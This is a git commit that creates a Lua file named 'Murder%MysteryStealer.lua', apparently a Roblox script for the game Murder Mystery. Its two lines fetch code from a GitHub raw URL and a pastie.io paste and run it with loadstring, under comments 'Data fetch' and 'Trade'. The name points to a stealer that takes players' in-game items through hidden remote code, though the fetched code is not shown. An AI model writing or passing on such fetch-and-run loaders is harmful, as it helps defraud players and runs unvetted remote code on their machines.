b6ec063096f2219f155fbc222d20ac8c6ee5ec7d
JzQhv <jodleenangelino@gmail.com>
2025-04-30 20:18:13 +0800

    Create Murder%MysteryStealer.lua

---
+++ Murder%MysteryStealer.lua
@@ -0,0 +1,6 @@
+--For Data fetch(Script 1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+
+--For Trade(Script 2)
+wait(3)
+loadstring(game:HttpGet('https://pastie.io/raw/pmehiy/raw'))()
